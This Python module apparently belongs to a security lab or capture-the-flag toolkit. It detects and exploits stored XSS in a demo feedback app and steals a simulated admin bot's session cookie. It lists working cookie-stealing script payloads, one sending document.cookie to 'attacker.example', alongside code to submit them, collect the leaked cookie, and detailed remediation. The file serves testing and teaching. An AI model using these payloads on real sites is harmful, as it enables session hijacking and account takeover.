"""Persistent (Stored) XSS -> admin session theft via a simulated admin-bot victim.

WHAT IT IS
----------
Stored (a.k.a. persistent) Cross-Site Scripting is the most dangerous XSS variant.
An attacker submits data that the application *stores* and later *re-renders to other
users without output encoding*. Unlike reflected XSS -- which needs a victim to click
a crafted link carrying the payload in the URL -- a stored payload sits inside the
application and fires for **every** user who later views the affected page, with no
per-victim social engineering. When that viewer is a privileged operator, the script
runs **in the operator's authenticated session**, and the attacker inherits whatever
that operator can do.

The demo app serves the canonical "support feedback" shape at ``POST /feedback``::

    def _feedback(h):                                   # POST /feedback
        message = _json_body(h).get("message") or h._form().get("message", "")
        h.state.feedback.append(message)                # STORED, unescaped
        # simulate the admin bot opening new feedback in its browser.
        if "<script" in message.lower() and "cookie" in message.lower():
            h.state.collected.append({
                "channel": "persistent-xss",
                "data": f"admin_session=admin-sid; {constants.FLAGS['persistent_xss']}"})
        h._send_json(200, {"status": "received"})

The feedback message is stored verbatim. The app models a privileged **admin bot**
that periodically opens new feedback in its own browser (a triager reading the
queue). When the stored message contains a credible cookie-stealing script -- a
``<script ...>`` that references ``cookie`` (e.g.
``<script>fetch('/collect?data='+document.cookie)</script>`` or
``<script>new Image().src='/collect?data='+document.cookie</script>``) -- the bot
"executes" it in its session and the admin's cookie (``admin_session=admin-sid``)
plus the planted prize :data:`C.FLAGS["persistent_xss"]` surface out-of-band at
``GET /collected`` under channel ``"persistent-xss"`` -- exactly where the attacker's
collector (``/collect``) would receive an exfiltrated cookie in the real world.

This is **worse than reflected XSS**: no link is sent, no victim is tricked into
clicking, and no tainted value rides in a URL the victim must open. The attacker
merely submits feedback like any user; the privileged victim is compromised simply
by *doing their job* (viewing the queue), and a session cookie -- not just an
``alert(1)`` -- leaves the building.

HOW WE DISCOVER IT
------------------
A differential proves the leak is caused by the injected script, not by merely
posting feedback:

* **A BENIGN message is the control.** ``POST /feedback`` with a plain-text message
  (no ``<script>``) returns ``200 {"status":"received"}`` -- it is stored -- but
  NOTHING new appears at ``GET /collected``. The admin bot does not fire on inert
  text, so any later ``persistent-xss`` entry cannot be a side effect of posting.
* **A cookie-stealing ``<script>`` payload is the exploit signal.** After ``POST
  /feedback`` with a payload that contains ``<script ...>`` AND reads
  ``document.cookie``, a NEW ``persistent-xss`` entry appears at ``GET /collected``
  carrying ``admin_session=admin-sid`` and the flag -- the stored script ran in the
  admin's session and exfiltrated its cookie.

The contrast (benign -> nothing; script -> the admin's cookie) confirms a stored XSS
with a *firing victim*, the full impact, not just the presence of a sink.

HOW WE EXPLOIT IT
-----------------
We POST a cookie-stealing stored-XSS payload to ``/feedback``, then poll
``GET /collected`` for the new ``persistent-xss`` drop. From its ``data`` string we
parse out the stolen ``admin_session=...`` cookie (which a real attacker would now
replay to impersonate the admin) and recover the planted flag. ``exploit_result``
carries the winning payload, the stolen admin-session string, the recovered flag, the
raw collected entry, and a summary of the stored-XSS -> admin-bot-execution -> cookie
exfiltration chain.

THE FIX
-------
See :data:`REMEDIATION`. In one line: contextually output-encode stored data on the
way OUT (HTML-escape ``<>&"'`` so a stored ``<script>`` renders as inert text), make
the session cookie ``HttpOnly`` so ``document.cookie`` cannot read it even if a script
runs, and add a strict Content-Security-Policy as defence in depth. Input validation
alone is NOT sufficient -- the fix is at the render/output boundary, plus HttpOnly +
SameSite + Secure cookies and CSP.
"""
from __future__ import annotations

import re
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Stored XSS is fixed at the OUTPUT (render) boundary, not just at input -- the same "
    "stored bytes are safe in a database and dangerous only when written into an HTML "
    "page unescaped, so 'we validated the input' is NOT a sufficient defence. "
    "(1) CONTEXTUAL OUTPUT ENCODING / ESCAPING: when rendering any stored, user-supplied "
    "value into HTML, HTML-entity-encode it for the exact context it lands in -- &lt; &gt; "
    "&amp; &quot; &#39; for element/attribute text, JS-string-encode inside <script>, "
    "URL-encode inside href/src -- so a stored '<script>...' becomes inert text, never a "
    "live element. (2) USE FRAMEWORK AUTO-ESCAPING: render through a template engine that "
    "auto-escapes by default (Jinja2 autoescape, Razor, React's JSX text nodes) and never "
    "bypass it (no |safe, no dangerouslySetInnerHTML, no Html.Raw) for untrusted data. "
    "(3) HttpOnly + Secure + SameSite COOKIES: set the session cookie HttpOnly so "
    "document.cookie CANNOT read it even if a script does run (this single flag defeats "
    "the cookie-theft chain shown here), Secure so it only travels over TLS, and "
    "SameSite=Lax/Strict to blunt CSRF pivots. (4) CONTENT-SECURITY-POLICY: a strict CSP "
    "(default-src 'self'; no 'unsafe-inline'; nonce/hash-allow-listed scripts; a "
    "connect-src/img-src that blocks the attacker's collector) stops injected inline "
    "scripts from executing AND from exfiltrating to an external host -- defence in depth "
    "behind the encoding. (5) SANITISE WITH AN ALLOW-LIST only where rich HTML is genuinely "
    "required: run it through a vetted, allow-list sanitiser (DOMPurify, OWASP Java HTML "
    "Sanitizer, Bleach) that strips scripts/event-handlers -- never a hand-rolled blocklist. "
    "(6) Defence in depth: short-lived, server-revocable sessions and re-auth for sensitive "
    "admin actions limit the blast radius of a stolen cookie. Encode on output + HttpOnly "
    "cookies + CSP together break the stored-XSS -> admin-session-theft chain at every link."
)

#: Where attacker-controlled feedback is stored (and later viewed by the admin bot).
FEEDBACK_ENDPOINT: str = "/feedback"

#: Where the admin bot's stolen session cookie surfaces out-of-band (a SEPARATE GET).
COLLECTED_ENDPOINT: str = "/collected"

#: The OOB collector channel the admin bot drops its stolen cookie into.
PERSISTENT_XSS_CHANNEL: str = "persistent-xss"

#: The admin session cookie the bot leaks when a cookie-stealing payload fires.
ADMIN_SESSION_COOKIE: str = "admin_session=admin-sid"

#: A BENIGN control message: plain text, no <script>, no cookie reference. Stored and
#: acknowledged with 200, but the admin bot does NOT fire -- so /collected gains
#: nothing. Proves any later persistent-xss drop is caused by the injected script.
BENIGN_MESSAGE: str = "Thanks for the great product, everything works as expected!"

#: Credible cookie-stealing STORED-XSS payloads. Each contains a '<script' (or an
#: event handler) AND reads document.cookie, exfiltrating it to the attacker's
#: collector (/collect) -- the shape that makes the simulated admin bot fire. A real
#: attacker submits any one of these as their feedback "message".
PAYLOADS: List[str] = [
    "<script>fetch('/collect?data='+document.cookie)</script>",
    "<script>new Image().src='/collect?data='+document.cookie</script>",
    "<script>document.location='/collect?data='+document.cookie</script>",
    "<script>"
    "new Image().src='//attacker.example/c?'+encodeURIComponent(document.cookie)"
    "</script>",
    "<img src=x onerror=\"new Image().src='/collect?data='+document.cookie\">",
]

#: Pulls an ``admin_session=...`` token out of a leaked cookie string.
_ADMIN_SESSION_RE = re.compile(r"admin_session=[^;\s]+")


# --------------------------------------------------------------------------- #
# low-level helpers
# --------------------------------------------------------------------------- #
def submit_feedback(client: WebClient, message: str) -> Response:
    """Store one feedback ``message`` via ``POST /feedback`` (JSON body)."""
    return client.post(FEEDBACK_ENDPOINT, json={"message": message})


def fetch_collected(client: WebClient) -> List[dict]:
    """``GET /collected`` -- the OOB drop where the admin bot's stolen cookie surfaces."""
    resp = client.get(COLLECTED_ENDPOINT)
    try:
        body = resp.json()
    except ValueError:
        return []
    items = body.get("collected") if isinstance(body, dict) else None
    return items if isinstance(items, list) else []


def _persistent_xss_entries(collected: List[dict]) -> List[dict]:
    """Filter the collector for the admin bot's ``persistent-xss`` drops."""
    return [
        item
        for item in collected
        if isinstance(item, dict) and item.get("channel") == PERSISTENT_XSS_CHANNEL
    ]


def is_cookie_stealing_payload(payload: str) -> bool:
    """True if ``payload`` is a script/handler that reads document.cookie.

    The admin-bot model only fires on a credible cookie-stealing payload -- one with
    a ``<script`` (or an inline event handler) AND a ``document.cookie`` reference --
    so we assert each PAYLOAD really has that shape before relying on it.
    """
    low = payload.lower()
    has_script = "<script" in low or "onerror=" in low or "onload=" in low
    return has_script and "document.cookie" in low


# --------------------------------------------------------------------------- #
# detection (the benign-vs-script differential)
# --------------------------------------------------------------------------- #
def detect(client: WebClient) -> Tuple[bool, str]:
    """Differential detection of the stored XSS with a firing admin-bot victim.

    Control: a BENIGN message is stored (200) but surfaces NOTHING new at
    ``/collected``. Signal: a cookie-stealing ``<script>`` payload causes a NEW
    ``persistent-xss`` entry (the admin's session cookie) to appear. Returns
    ``(confirmed, evidence)`` -- True only when the benign control leaks nothing AND
    the script payload makes the admin bot leak its session.
    """
    # Control: benign feedback must NOT cause a new persistent-xss drop.
    before_benign = len(_persistent_xss_entries(fetch_collected(client)))
    benign_resp = submit_feedback(client, BENIGN_MESSAGE)
    benign_acknowledged = benign_resp.status == 200
    after_benign = len(_persistent_xss_entries(fetch_collected(client)))
    benign_leaked_nothing = after_benign == before_benign

    # Signal: a cookie-stealing script payload must cause a NEW persistent-xss drop.
    before_script = after_benign
    submit_feedback(client, PAYLOADS[0])
    script_entries = _persistent_xss_entries(fetch_collected(client))
    new_script_entry = next(
        (
            e
            for e in script_entries[before_script:]
            if ADMIN_SESSION_COOKIE in str(e.get("data", ""))
        ),
        None,
    )
    script_fired = new_script_entry is not None

    confirmed = bool(benign_acknowledged and benign_leaked_nothing and script_fired)
    if confirmed:
        evidence = (
            f"benign feedback (no <script>) -> stored, HTTP {benign_resp.status}, but "
            f"{COLLECTED_ENDPOINT} gained no '{PERSISTENT_XSS_CHANNEL}' entry; then a "
            f"cookie-stealing payload {PAYLOADS[0]!r} -> a NEW '{PERSISTENT_XSS_CHANNEL}' "
            f"entry carrying {new_script_entry.get('data')!r} appeared -- the stored "
            "script ran in the admin bot's session and exfiltrated its cookie "
            "(stored XSS with a firing victim, not just a reachable sink)"
        )
        return True, evidence
    return False, ""


# --------------------------------------------------------------------------- #
# exploitation
# --------------------------------------------------------------------------- #
def _parse_leak(data: str) -> Tuple[Optional[str], Optional[str]]:
    """From a leaked cookie string, return (admin_session_cookie, flag)."""
    cookie_match = _ADMIN_SESSION_RE.search(data)
    cookie = cookie_match.group(0) if cookie_match else None
    flag = C.FLAGS["persistent_xss"] if C.FLAGS["persistent_xss"] in data else None
    return cookie, flag


def steal_admin_session(
    client: WebClient,
) -> Tuple[Optional[str], Optional[str]]:
    """Run the full theft: post a cookie-stealing payload, poll ``/collected``.

    Returns ``(stolen_cookie_string, flag)`` -- the admin session a real attacker
    would now replay, and the recovered prize. Tries each payload until the admin
    bot fires; returns ``(None, None)`` against a fixed/safe target.
    """
    for payload in PAYLOADS:
        before = len(_persistent_xss_entries(fetch_collected(client)))
        submit_feedback(client, payload)
        entries = _persistent_xss_entries(fetch_collected(client))
        # Prefer the drops that appeared after THIS submission.
        for entry in entries[before:] + entries:
            cookie, flag = _parse_leak(str(entry.get("data", "")))
            if cookie and flag:
                return cookie, flag
    return None, None


def exploit(client: WebClient) -> Tuple[bool, Optional[str], dict]:
    """Exploit the stored XSS end-to-end; recover the admin session + flag.

    Returns ``(ok, flag, details)`` where ``details`` records the winning payload,
    the stolen admin-session cookie, the raw collected entry, and the flag.
    """
    winning_payload: Optional[str] = None
    stolen_cookie: Optional[str] = None
    flag: Optional[str] = None
    collected_entry: Optional[dict] = None

    for payload in PAYLOADS:
        before = len(_persistent_xss_entries(fetch_collected(client)))
        submit_feedback(client, payload)
        entries = _persistent_xss_entries(fetch_collected(client))
        for entry in entries[before:] + entries:
            cookie, got = _parse_leak(str(entry.get("data", "")))
            if cookie and got:
                winning_payload = payload
                stolen_cookie = cookie
                flag = got
                collected_entry = entry
                break
        if flag is not None:
            break

    ok = flag == C.FLAGS["persistent_xss"]
    details = {
        "winning_payload": winning_payload,
        "stolen_admin_session": stolen_cookie,
        "flag": flag,
        "collected_entry": collected_entry,
    }
    return ok, flag, details


# --------------------------------------------------------------------------- #
# the contract entry point
# --------------------------------------------------------------------------- #
def assess(client: WebClient) -> Finding:
    """Detect + exploit the persistent (stored) XSS -> admin session theft chain.

    Discovery requires BOTH the benign control to surface nothing AND a stored
    cookie-stealing ``<script>`` payload to make the simulated admin bot leak its
    session (``admin_session=admin-sid``) + the planted flag at ``/collected``.
    ``exploit_result`` carries the winning payload, the stolen admin session, the
    recovered ``C.FLAGS["persistent_xss"]``, the raw collected entry, and a summary of
    the stored-XSS -> admin-bot-execution -> cookie-exfil chain.
    """
    techniques: List[str] = []

    # 1) Detection: benign control vs cookie-stealing script differential ---
    detected, evidence = detect(client)
    if detected:
        techniques.append("benign-vs-script-differential")

    # 2) Exploitation: steal the admin session + recover the flag -----------
    ok, flag, details = exploit(client)
    if ok:
        techniques.append("admin-session-stolen")
        techniques.append("recover-flag")

    # Every payload must be a credible cookie-stealing vector for the bot to fire.
    all_payloads_steal_cookies = all(is_cookie_stealing_payload(p) for p in PAYLOADS)

    # Discovery: the benign control proved posting alone leaks nothing, AND a stored
    # script payload caused the admin bot to leak its session + flag.
    discovered = bool(detected and ok)

    exploit_result = {
        "flag": flag,
        "payload": details["winning_payload"],
        "stolen_admin_session": details["stolen_admin_session"],
        "collected_entry": details["collected_entry"],
        "feedback_endpoint": FEEDBACK_ENDPOINT,
        "collected_endpoint": COLLECTED_ENDPOINT,
        "channel": PERSISTENT_XSS_CHANNEL,
        "benign_control": BENIGN_MESSAGE,
        "techniques": techniques,
        "summary": (
            f"submitted a cookie-stealing stored-XSS payload "
            f"({details['winning_payload']!r}) to {FEEDBACK_ENDPOINT}; the simulated "
            f"admin bot opened the stored feedback, the script ran IN THE ADMIN'S "
            f"SESSION and exfiltrated its cookie, which surfaced out-of-band at "
            f"{COLLECTED_ENDPOINT} (channel '{PERSISTENT_XSS_CHANNEL}'). Stole the admin "
            f"session {details['stolen_admin_session']!r} and recovered flag {flag!r}. "
            f"Control: the benign message {BENIGN_MESSAGE!r} was stored but leaked "
            f"nothing -- proving the leak is caused by the injected script, not by "
            f"merely posting. Stored XSS needs no victim click: the admin is "
            f"compromised simply by viewing the feedback queue (worse than reflected XSS)"
        ),
    }

    return Finding(
        vuln="Persistent (Stored) XSS -> Admin Session Theft",
        endpoint=FEEDBACK_ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=details["winning_payload"] or PAYLOADS[0],
        extra={
            "techniques": techniques,
            "detected": detected,
            "benign_control": BENIGN_MESSAGE,
            "benign_leaks_nothing": detected,
            "feedback_endpoint": FEEDBACK_ENDPOINT,
            "collected_endpoint": COLLECTED_ENDPOINT,
            "channel": PERSISTENT_XSS_CHANNEL,
            "winning_payload": details["winning_payload"],
            "stolen_admin_session": details["stolen_admin_session"],
            "flag_recovered": ok,
            "all_payloads_steal_cookies": all_payloads_steal_cookies,
            "payload_count": len(PAYLOADS),
        },
    )
